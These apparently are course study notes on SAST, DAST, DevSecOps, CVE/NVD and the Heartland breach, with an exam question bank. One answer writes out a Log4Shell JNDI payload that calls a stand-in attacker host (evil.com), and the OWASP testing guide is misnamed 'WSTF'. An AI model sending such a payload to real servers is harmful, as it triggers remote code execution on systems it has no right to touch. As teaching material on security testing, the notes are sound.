# Session 5: SAST, DAST, Web Application Frameworks & Case Studies

> **Exam Weight:** Medium | **Type:** Theory + Self Learning

---

## 1. SAST – Static Application Security Testing

### 1.1 What is SAST?
**SAST** analyzes application **source code, bytecode, or binaries** without executing the application. Also called **"white-box testing"**.

```
Developer writes code → SAST tool scans code → Reports vulnerabilities
                                          ↑
                             (No running app needed)
```

### 1.2 How SAST Works
- Parses source code into an **Abstract Syntax Tree (AST)**
- Traces data flow from sources (user input) to sinks (dangerous functions)
- Identifies patterns matching known vulnerability types
- Reports line numbers and file names

### 1.3 What SAST Can Find
- SQL Injection (unsafe string concatenation)
- XSS (unsanitized output)
- Buffer overflows (unsafe C functions)
- Hardcoded credentials (`password = "admin123"`)
- Insecure cryptography (MD5, SHA1, DES)
- Null pointer dereferences
- Race conditions
- Unvalidated input

### 1.4 Popular SAST Tools

| Tool | Language Support | Notes |
|------|----------------|-------|
| **Checkmarx** | 25+ languages | Enterprise, very comprehensive |
| **Fortify (OpenText)** | Java, .NET, C++, PHP, Python | Industry standard |
| **SonarQube** | 27+ languages | Open source community edition |
| **Bandit** | Python only | Open source, lightweight |
| **FindBugs/SpotBugs** | Java | Open source |
| **Semgrep** | Multi-language | Open source, rule-based |
| **CodeQL** | Multi-language | GitHub's engine |
| **Brakeman** | Ruby on Rails | Framework-specific |

### 1.5 SAST Limitations
- **False positives** — reports issues that aren't real vulnerabilities
- **False negatives** — misses some runtime vulnerabilities
- Cannot detect **logic flaws** (business logic bugs)
- Cannot detect **configuration errors** in deployment
- Slow for large codebases
- Cannot detect vulnerabilities in third-party libraries (use SCA tools instead)

> **Tricky Q:** What is the main limitation of SAST that DAST overcomes?
> **A:** SAST cannot detect runtime/deployment issues (misconfiguration, auth flaws, server-side issues). DAST tests the running application in its actual deployed state.

---

## 2. DAST – Dynamic Application Security Testing

### 2.1 What is DAST?
**DAST** tests a **running application** by sending malicious inputs and observing responses. Also called **"black-box testing"** (no access to source code needed).

```
Running App → DAST tool sends payloads → Analyzes responses → Reports vulnerabilities
                                    ↑
                        (Source code NOT needed)
```

### 2.2 How DAST Works
- Crawls the application (maps all endpoints)
- Sends automated test payloads (SQLi, XSS, etc.)
- Analyzes HTTP responses for vulnerability signatures
- Checks for information leakage in errors

### 2.3 What DAST Can Find
- SQL Injection
- XSS (reflected, stored, DOM-based)
- Authentication flaws
- Session management issues
- Directory traversal
- Open redirects
- Insecure HTTP methods
- Missing security headers
- SSL/TLS misconfiguration

### 2.4 Popular DAST Tools

| Tool | Type | Notes |
|------|------|-------|
| **OWASP ZAP** (Zed Attack Proxy) | Open source | Most popular free DAST |
| **Burp Suite Professional** | Commercial | Industry standard |
| **Nikto** | Open source | Web server scanner |
| **Acunetix** | Commercial | Comprehensive web scanner |
| **Nessus** | Commercial | Network + web vulnerabilities |
| **AppScan (IBM)** | Commercial | Enterprise DAST |
| **Skipfish** | Open source | Google's web scanner |

### 2.5 DAST Limitations
- Needs a **running application** to test
- Cannot pinpoint exact line of code with the bug
- May miss **stored vulnerabilities** (stored XSS, second-order SQLi)
- Can be **disruptive** to production environments
- Slower than SAST (makes actual requests)
- Requires authentication configuration to test authenticated areas

---

## 3. SAST vs DAST vs IAST — Comparison Table

| Aspect | SAST | DAST | IAST |
|--------|------|------|------|
| Full name | Static AST | Dynamic AST | Interactive AST |
| Also called | White-box | Black-box | Grey-box |
| Needs source code? | Yes | No | Yes (agents) |
| Needs running app? | No | Yes | Yes |
| Stage | Development | Testing/Production | Testing |
| False positives | High | Medium | Low |
| Speed | Fast analysis | Slow (network) | Real-time |
| Logic flaws? | No | Sometimes | Sometimes |
| Examples | Checkmarx, Fortify | ZAP, Burp | Contrast Security |

> **Tricky Q:** What is IAST (Interactive AST)?
> **A:** Agents/sensors are embedded inside the running application. They instrument the code and monitor it from the inside while DAST tests from the outside. Combines accuracy of SAST with runtime context of DAST.

> **Tricky Q:** What is SCA (Software Composition Analysis)?
> **A:** Analyzes third-party dependencies/libraries for known CVEs. Neither SAST nor DAST covers this. Tools: OWASP Dependency-Check, Snyk, Black Duck.

---

## 4. DevSecOps — Shift Left

### 4.1 Security in SDLC

```
Requirements → Design → Development → Testing → Deployment → Operations
     ↓            ↓           ↓           ↓           ↓            ↓
  Threat        STRIDE     SAST/Code    DAST/      SAST in     DAST/
 Analysis      Modelling   Review      Pentest     CI/CD       Monitoring
```

**"Shift Left"** = move security earlier in the development lifecycle (cheaper to fix early).

**Cost to fix a bug:**
- Requirements phase: 1×
- Design: 5×
- Development: 10×
- Testing: 15×
- Production: 100×

### 4.2 CI/CD Pipeline Security

```
Git commit → Build → SAST → Unit tests → Container scan → Deploy staging → DAST → Deploy prod
```

---

## 5. Browser-jsguard Firefox Add-on

### 5.1 What is jsguard?
A Firefox extension that **detects malicious and suspicious JavaScript** in web pages before it executes.

### 5.2 What it Detects
- **Drive-by download attacks** — malicious code that auto-downloads malware
- **Browser exploits** — code targeting browser vulnerabilities
- **Malicious redirects** — JS that redirects to phishing/malware sites
- **Obfuscated code** — heavily encoded JS (common in malware)
- **Shellcode patterns** — NOP sleds and shellcode signatures in JS

### 5.3 How it Works
- Heuristic analysis of JavaScript code
- Pattern matching against known malicious patterns
- Alerts user and blocks execution if threat detected

> **Tricky Q:** What type of attack does jsguard primarily protect against?
> **A:** Drive-by download attacks and browser-based exploits via malicious JavaScript

---

## 6. Case Study: Heartland Payment Systems Breach

### 6.1 Overview
- **Year:** 2008
- **Company:** Heartland Payment Systems (payment processor)
- **Data compromised:** ~130 million credit/debit card numbers
- **Attack vector:** SQL Injection

### 6.2 How the Attack Worked
1. Attackers performed **SQL injection** on Heartland's web application
2. Used access to install **packet sniffer/malware** on payment processing network
3. Malware captured **unencrypted card data** in transit between card reader and processing server
4. Data exfiltrated to attacker servers

### 6.3 Key Lessons
- Input validation failure led to initial breach
- **Data-in-transit** was unencrypted at a critical point (should have been end-to-end encrypted)
- Lack of **network segmentation** allowed lateral movement
- Poor **intrusion detection** delayed discovery (breach lasted months)

### 6.4 Aftermath
- $140 million in settlements
- Led to push for **P2PE** (Point-to-Point Encryption) and **tokenization**
- PCI DSS compliance became stricter

> **Tricky Q:** What was the root cause of the Heartland breach?
> **A:** SQL injection on a web application, followed by malware installation that captured unencrypted payment card data

---

## 7. OWASP Web Security Testing Guide (WSTF)

### 7.1 What is WSTF?
OWASP's comprehensive guide for **web application security testing methodology**. Formerly called OWASP Testing Guide (OTG).

### 7.2 WSTF Categories

| Category | What's Tested |
|----------|--------------|
| **Information Gathering** | Fingerprinting, recon |
| **Configuration Testing** | Server config, SSL/TLS |
| **Identity Management** | User enumeration, account policies |
| **Authentication Testing** | Login bypass, brute force, MFA weaknesses |
| **Authorization Testing** | Access control, path traversal |
| **Session Management** | Session tokens, CSRF, session fixation |
| **Input Validation** | SQLi, XSS, XXE, code injection |
| **Error Handling** | Info leakage in errors |
| **Cryptography** | Weak algorithms, key management |
| **Business Logic** | Workflow bypass, race conditions |
| **Client-side Testing** | DOM XSS, HTML injection |

---

## 8. CVE and NVD

### 8.1 CVE (Common Vulnerabilities and Exposures)
- A **dictionary of publicly known vulnerabilities**
- Maintained by MITRE Corporation
- Each entry has unique ID: `CVE-YEAR-NUMBER` (e.g., `CVE-2021-44228` = Log4Shell)
- Provides: description, references, not severity scores

### 8.2 NVD (National Vulnerability Database)
- NIST's database that **extends CVE with CVSS scores**
- Provides: CVSS score, CPE (affected products), remediation info
- URL: nvd.nist.gov

### 8.3 Famous CVEs to Know

| CVE | Name | Description |
|-----|------|-------------|
| CVE-2014-0160 | **Heartbleed** | OpenSSL buffer over-read, leaks memory |
| CVE-2014-6271 | **Shellshock** | Bash vulnerability, RCE via env variables |
| CVE-2017-0144 | **EternalBlue** | SMB vulnerability used by WannaCry |
| CVE-2021-44228 | **Log4Shell** | Log4j JNDI injection, RCE |
| CVE-2021-34527 | **PrintNightmare** | Windows Print Spooler RCE/LPE |

> **Tricky Q:** What is the difference between CVE and NVD?
> **A:** CVE is a list/dictionary of vulnerability identifiers with descriptions. NVD builds on CVE by adding CVSS severity scores, affected product lists (CPE), and remediation guidance.

---

## 9. Exam Questions Bank

**Q1:** What does SAST stand for and when is it used?
**A:** Static Application Security Testing — used during development phase without running the application

**Q2:** Which tool is OWASP's recommended open-source DAST scanner?
**A:** OWASP ZAP (Zed Attack Proxy)

**Q3:** Can DAST find hardcoded passwords in source code?
**A:** No — DAST tests running applications; hardcoded credentials require SAST or manual code review

**Q4:** What is the Log4Shell vulnerability (CVE-2021-44228)?
**A:** A critical RCE in Apache Log4j via JNDI injection in log messages — attacker sends `${jndi:ldap://evil.com/a}` which gets logged and executed

**Q5:** What does "shift left" mean in DevSecOps?
**A:** Integrating security earlier in the SDLC (moving security "left" on the timeline) so bugs are caught and fixed cheaper during development rather than production

**Q6:** What is tokenization (mentioned in Heartland context)?
**A:** Replacing sensitive data (credit card numbers) with a non-sensitive substitute (token) that has no exploitable value outside the specific system

**Q7:** What is a false positive in security testing?
**A:** A tool reports a vulnerability that doesn't actually exist. Common in SAST. Opposite: false negative = missing a real vulnerability.

**Q8:** What does PCI DSS stand for?
**A:** Payment Card Industry Data Security Standard — mandatory compliance standard for organizations handling credit card data

---

*Next: Session 6 → Security Management Concepts & Principles*
